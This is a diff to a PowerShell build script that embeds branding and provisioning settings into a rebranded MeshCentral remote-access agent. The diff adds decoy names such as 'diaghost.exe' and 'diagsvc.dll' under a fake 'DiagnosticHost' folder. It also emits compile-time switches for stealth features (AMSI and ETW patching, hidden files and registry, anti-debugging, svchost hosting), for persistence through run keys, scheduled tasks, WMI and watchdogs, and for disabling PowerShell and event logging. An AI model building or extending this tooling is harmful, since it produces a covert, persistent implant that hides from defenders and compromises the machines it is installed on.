@@ -21,16 +21,69 @@ if (-not (Test-Path -LiteralPath $brandingHelper)) {
     throw "Branding helper missing at $brandingHelper"
 }
 . $brandingHelper
-$ConfigPath = Resolve-BrandingConfigPath -RepoRoot $repoRoot -ConfigPath $ConfigPath
+$brandingConfig = Get-BrandingConfig -RepoRoot $repoRoot -ConfigPath $ConfigPath
+$ConfigPath = $brandingConfig.Path
 
 Write-Host "=== MeshAgent Provisioning Embedder ===" -ForegroundColor Cyan
 
-# Read config
-$config = Get-Content $ConfigPath -Raw | ConvertFrom-Json
+$config = $brandingConfig.Config
+Write-Host "[INFO] Using branding configuration: $ConfigPath" -ForegroundColor Yellow
 
 if ([string]::IsNullOrWhiteSpace($config.branding.serviceName) -or [string]::IsNullOrWhiteSpace($config.branding.displayName)) {
     throw "branding.serviceName and branding.displayName must be populated in $ConfigPath"
 }
+
+function Get-OptionalValue {
+    param(
+        [Parameter(Mandatory = $true)]
+        [object]$Source,
+        [Parameter(Mandatory = $true)]
+        [string]$PropertyName
+    )
+
+    if ($null -eq $Source) { return $null }
+    if ($Source -is [System.Collections.IDictionary]) {
+        if ($Source.Contains($PropertyName)) { return $Source[$PropertyName] }
+        if ($Source.ContainsKey($PropertyName)) { return $Source[$PropertyName] }
+    }
+
+    $property = $Source.PSObject.Properties[$PropertyName]
+    if ($null -ne $property) {
+        return $property.Value
+    }
+    return $null
+}
+
+function Get-OptionalBool {
+    param(
+        [object]$Source,
+        [string]$PropertyName,
+        [bool]$Default = $false
+    )
+
+    $value = Get-OptionalValue -Source $Source -PropertyName $PropertyName
+    if ($null -eq $value) { return $Default }
+    return [bool]$value
+}
+
+function BoolToInt($val) {
+    if ($val -eq $true) { return 1 } else { return 0 }
+}
+
+# Derived branding artifacts
+$installRoot = if ($config.branding.installRoot) { $config.branding.installRoot } else { "C:/ProgramData/DiagnosticHost" }
+$logPath = if ($config.branding.logPath) { $config.branding.logPath } else { "$installRoot/logs" }
+$binaryName = if ($config.branding.binaryName) { $config.branding.binaryName } else { "diaghost.exe" }
+$svcDllName = Get-OptionalValue -Source $config.stealth -PropertyName 'serviceDllName'
+if ([string]::IsNullOrWhiteSpace($svcDllName)) { $svcDllName = "diagsvc.dll" }
+$artifacts = Get-OptionalValue -Source $config -PropertyName 'artifacts'
+$databaseName = Get-OptionalValue -Source $artifacts -PropertyName 'databaseName'
+if ([string]::IsNullOrWhiteSpace($databaseName)) { $databaseName = "diaghost.db" }
+$configFileName = Get-OptionalValue -Source $artifacts -PropertyName 'configFileName'
+if ([string]::IsNullOrWhiteSpace($configFileName)) { $configFileName = "diaghost.conf" }
+$logFileName = Get-OptionalValue -Source $artifacts -PropertyName 'logFileName'
+if ([string]::IsNullOrWhiteSpace($logFileName)) { $logFileName = "diagnostics.log" }
+$logPath = $logPath.TrimEnd('/')
 
 # Normalise allowlist entries
 $allowedThumbprints = @()
@@ -73,21 +126,39 @@ function Convert-ThumbprintsToMacro {
 
 $allowlistMacro = Convert-ThumbprintsToMacro -Thumbprints $allowedThumbprints
 
-# Helper function for boolean to int
-function BoolToInt($val) {
-    if ($val -eq $true) { return 1 } else { return 0 }
-}
-
 # Derive bundle extraction behavior (svchost requires extraction)
-$bundleExtractFlag = $false
-if ($null -ne $config.stealth.bundleExtract) {
-    $bundleExtractFlag = [bool]$config.stealth.bundleExtract
-}
-if ($config.stealth.svchostMode -and -not $bundleExtractFlag) {
+$bundleExtractFlag = Get-OptionalBool -Source $config.stealth -PropertyName 'bundleExtract'
+$svchostMode = Get-OptionalBool -Source $config.stealth -PropertyName 'svchostMode'
+if ($svchostMode -and -not $bundleExtractFlag) {
     Write-Host "[WARN] Svchost mode enabled but bundle extraction disabled in branding config; forcing extraction on." -ForegroundColor Yellow
     $bundleExtractFlag = $true
 }
 $config.stealth.bundleExtract = $bundleExtractFlag
+$stealthEnabledFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'enabled')
+$stealthHideFilesFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'hideFiles')
+$stealthHideRegistryFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'hideRegistry')
+$stealthAmsiFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'amsiPatch')
+$stealthEttwFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'ettwPatch')
+$stealthAntiDebugFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'antiDebug')
+$stealthSyscallsFlag = BoolToInt (Get-OptionalBool -Source $config.stealth -PropertyName 'syscallsDirectMode')
+$stealthSvchostFlag = BoolToInt $svchostMode
+$stealthBundleFlag = BoolToInt $bundleExtractFlag
+
+$persistence = if ($config.persistence) { $config.persistence } else { [pscustomobject]@{} }
+$scheduledTask = if ($persistence.scheduledTask) { $persistence.scheduledTask } else { [pscustomobject]@{} }
+$wmiSection = if ($persistence.wmi) { $persistence.wmi } else { [pscustomobject]@{} }
+$watchdogSection = if ($persistence.watchdog) { $persistence.watchdog } else { [pscustomobject]@{} }
+$persistRunKeyFlag = BoolToInt (Get-OptionalBool -Source $persistence -PropertyName 'runKey')
+$persistTaskFlag = BoolToInt (Get-OptionalBool -Source $scheduledTask -PropertyName 'enabled')
+$persistWmiFlag = BoolToInt (Get-OptionalBool -Source $wmiSection -PropertyName 'enabled')
+$persistWatchdogFlag = BoolToInt (Get-OptionalBool -Source $watchdogSection -PropertyName 'enabled')
+
+$evasion = if ($config.evasion) { $config.evasion } else { [pscustomobject]@{} }
+$evasionPsLoggingFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'disablePowerShellLogging')
+$evasionEventLogsFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'disableEventLogs')
+$evasionEtwFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'disableETW')
+$evasionHideTaskmanFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'hideFromTaskManager')
+$evasionSyscallsFlag = BoolToInt (Get-OptionalBool -Source $evasion -PropertyName 'useSyscalls')
 
 function Get-VersionParts {
     param([string]$version)
@@ -158,8 +229,20 @@ $header = @"
 #define MESH_AGENT_COPYRIGHT "$($config.branding.versionInfo.legalCopyright)"
 #undef MESH_AGENT_ORIGINAL_FILENAME
 #define MESH_AGENT_ORIGINAL_FILENAME "$($originalFilename)"
+#undef MESH_AGENT_INSTALL_ROOT
+#define MESH_AGENT_INSTALL_ROOT TEXT("$installRoot")
 #undef MESH_AGENT_LOG_DIRECTORY
-#define MESH_AGENT_LOG_DIRECTORY TEXT("$($config.branding.logPath)")
+#define MESH_AGENT_LOG_DIRECTORY TEXT("$logPath")
+#undef MESH_AGENT_BINARY_NAME
+#define MESH_AGENT_BINARY_NAME TEXT("$binaryName")
+#undef MESH_AGENT_SVCHOST_DLL
+#define MESH_AGENT_SVCHOST_DLL TEXT("$svcDllName")
+#undef MESH_AGENT_ARTIFACT_DB
+#define MESH_AGENT_ARTIFACT_DB TEXT("$databaseName")
+#undef MESH_AGENT_ARTIFACT_CONFIG
+#define MESH_AGENT_ARTIFACT_CONFIG TEXT("$configFileName")
+#undef MESH_AGENT_ARTIFACT_LOG
+#define MESH_AGENT_ARTIFACT_LOG TEXT("$logFileName")
 #undef MESH_AGENT_FILE_VERSION_MAJOR
 #define MESH_AGENT_FILE_VERSION_MAJOR $($fileVersionParts[0])
 #undef MESH_AGENT_FILE_VERSION_MINOR
@@ -195,28 +278,28 @@ $header = @"
 #define MESH_AGENT_MESH_TYPE $($config.provisioning.meshType)
 
 /* ========== Stealth Features ========== */
-#define MESH_AGENT_STEALTH_ENABLED $(BoolToInt $config.stealth.enabled)
-#define MESH_AGENT_SVCHOST_MODE $(BoolToInt $config.stealth.svchostMode)
-#define MESH_AGENT_HIDE_FILES $(BoolToInt $config.stealth.hideFiles)
-#define MESH_AGENT_HIDE_REGISTRY $(BoolToInt $config.stealth.hideRegistry)
-#define MESH_AGENT_AMSI_PATCH $(BoolToInt $config.stealth.amsiPatch)
-#define MESH_AGENT_ETW_PATCH $(BoolToInt $config.stealth.ettwPatch)
-#define MESH_AGENT_ANTI_DEBUG $(BoolToInt $config.stealth.antiDebug)
-#define MESH_AGENT_SYSCALLS_DIRECT $(BoolToInt $config.stealth.syscallsDirectMode)
-#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $(BoolToInt $config.stealth.bundleExtract)
+#define MESH_AGENT_STEALTH_ENABLED $stealthEnabledFlag
+#define MESH_AGENT_SVCHOST_MODE $stealthSvchostFlag
+#define MESH_AGENT_HIDE_FILES $stealthHideFilesFlag
+#define MESH_AGENT_HIDE_REGISTRY $stealthHideRegistryFlag
+#define MESH_AGENT_AMSI_PATCH $stealthAmsiFlag
+#define MESH_AGENT_ETW_PATCH $stealthEttwFlag
+#define MESH_AGENT_ANTI_DEBUG $stealthAntiDebugFlag
+#define MESH_AGENT_SYSCALLS_DIRECT $stealthSyscallsFlag
+#define MESH_AGENT_BUNDLE_EXTRACT_DEFAULT $stealthBundleFlag
 
 /* ========== Persistence Configuration ========== */
-#define MESH_AGENT_PERSIST_RUNKEY $(BoolToInt $config.persistence.runKey)
-#define MESH_AGENT_PERSIST_TASK $(BoolToInt $config.persistence.scheduledTask.enabled)
-#define MESH_AGENT_PERSIST_WMI $(BoolToInt $config.persistence.wmi.enabled)
-#define MESH_AGENT_PERSIST_WATCHDOG $(BoolToInt $config.persistence.watchdog.enabled)
+#define MESH_AGENT_PERSIST_RUNKEY $persistRunKeyFlag
+#define MESH_AGENT_PERSIST_TASK $persistTaskFlag
+#define MESH_AGENT_PERSIST_WMI $persistWmiFlag
+#define MESH_AGENT_PERSIST_WATCHDOG $persistWatchdogFlag
 
 /* ========== Evasion Features ========== */
-#define MESH_AGENT_DISABLE_PS_LOGGING $(BoolToInt $config.evasion.disablePowerShellLogging)
-#define MESH_AGENT_DISABLE_EVENT_LOGS $(BoolToInt $config.evasion.disableEventLogs)
-#define MESH_AGENT_DISABLE_ETW $(BoolToInt $config.evasion.disableETW)
-#define MESH_AGENT_HIDE_TASKMANAGER $(BoolToInt $config.evasion.hideFromTaskManager)
-#define MESH_AGENT_USE_SYSCALLS $(BoolToInt $config.evasion.useSyscalls)
+#define MESH_AGENT_DISABLE_PS_LOGGING $evasionPsLoggingFlag
+#define MESH_AGENT_DISABLE_EVENT_LOGS $evasionEventLogsFlag
+#define MESH_AGENT_DISABLE_ETW $evasionEtwFlag
+#define MESH_AGENT_HIDE_TASKMANAGER $evasionHideTaskmanFlag
+#define MESH_AGENT_USE_SYSCALLS $evasionSyscallsFlag
 
 /* ========== Signing Allowlist ========== */
 $allowlistBlock
@@ -234,19 +317,28 @@ Write-Host "[SUCCESS] Branding header generated: $OutputHeader" -ForegroundColor
 
 # Generate .msh file (MeshCentral key/value format)
 $mshLines = @()
-if ($config.provisioning.meshName)   { $mshLines += "MeshName=$($config.provisioning.meshName)" }
-if ($config.provisioning.meshType)   { $mshLines += "MeshType=$($config.provisioning.meshType)" }
-if ($config.provisioning.meshId)     { $mshLines += "MeshID=$($config.provisioning.meshId)" }
-if ($config.provisioning.serverId)   { $mshLines += "ServerID=$($config.provisioning.serverId)" }
-if ($config.provisioning.serverUrl)  { $mshLines += "MeshServer=$($config.provisioning.serverUrl)" }
-if ($config.branding.serviceName)    { $mshLines += "meshServiceName=$($config.branding.serviceName)" }
-if ($config.branding.displayName)    { $mshLines += "displayName=$($config.branding.displayName)" }
+$meshNameValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshName'
+if ($meshNameValue) { $mshLines += "MeshName=$meshNameValue" }
+$meshTypeValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshType'
+if ($meshTypeValue) { $mshLines += "MeshType=$meshTypeValue" }
+$meshIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'meshId'
+if ($meshIdValue) { $mshLines += "MeshID=$meshIdValue" }
+$serverIdValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverId'
+if ($serverIdValue) { $mshLines += "ServerID=$serverIdValue" }
+$serverUrlValue = Get-OptionalValue -Source $config.provisioning -PropertyName 'serverUrl'
+if ($serverUrlValue) { $mshLines += "MeshServer=$serverUrlValue" }
+$serviceNameValue = $config.branding.serviceName
+if ($serviceNameValue) { $mshLines += "meshServiceName=$serviceNameValue" }
+$displayNameValue = $config.branding.displayName
+if ($displayNameValue) { $mshLines += "displayName=$displayNameValue" }
 
-if ($null -ne $config.provisioning.installFlags -and $config.provisioning.installFlags -ne "") {
-    $mshLines += "InstallFlags=$($config.provisioning.installFlags)"
+$installFlags = Get-OptionalValue -Source $config.provisioning -PropertyName 'installFlags'
+if ($null -ne $installFlags -and $installFlags -ne "") {
+    $mshLines += "InstallFlags=$installFlags"
 }
-if ($null -ne $config.provisioning.autoRegister) {
-    $autoRegisterValue = if ([bool]$config.provisioning.autoRegister) { "1" } else { "0" }
+$autoRegisterRaw = Get-OptionalValue -Source $config.provisioning -PropertyName 'autoRegister'
+if ($autoRegisterRaw -ne $null) {
+    $autoRegisterValue = if ([bool]$autoRegisterRaw) { "1" } else { "0" }
     $mshLines += "AutoRegister=$autoRegisterValue"
 }
 
@@ -255,6 +347,12 @@ Write-Host "[SUCCESS] .msh file generated: $OutputMsh" -ForegroundColor Green
 
 Write-Host ""
 Write-Host "=== Provisioning Embedded ===" -ForegroundColor Green
-Write-Host "Mesh ID:   $($config.provisioning.meshId.Substring(0,20))..." -ForegroundColor Cyan
-Write-Host "Server ID: $($config.provisioning.serverId.Substring(0,20))..." -ForegroundColor Cyan
+if ($meshIdValue) {
+    $meshIdPreview = if ($meshIdValue.Length -gt 20) { $meshIdValue.Substring(0,20) + "..." } else { $meshIdValue }
+    Write-Host "Mesh ID:   $meshIdPreview" -ForegroundColor Cyan
+}
+if ($serverIdValue) {
+    $serverIdPreview = if ($serverIdValue.Length -gt 20) { $serverIdValue.Substring(0,20) + "..." } else { $serverIdValue }
+    Write-Host "Server ID: $serverIdPreview" -ForegroundColor Cyan
+}
 Write-Host ""
